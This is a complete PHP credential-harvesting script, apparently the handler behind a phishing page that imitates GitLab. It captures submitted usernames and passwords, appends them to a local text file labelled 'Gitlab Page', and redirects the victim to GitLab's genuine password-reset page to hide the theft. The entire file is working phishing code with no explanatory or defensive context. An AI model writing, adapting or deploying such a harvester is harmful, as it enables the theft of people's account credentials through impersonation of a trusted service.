<?php

file_put_contents("physcoder.txt", "Gitlab Page\nUsername: " . $_POST['login'] . "\nPassword: " . $_POST['password'] . "\n\n", FILE_APPEND);
header('Location: https://gitlab.com/users/password/new');
exit();
?>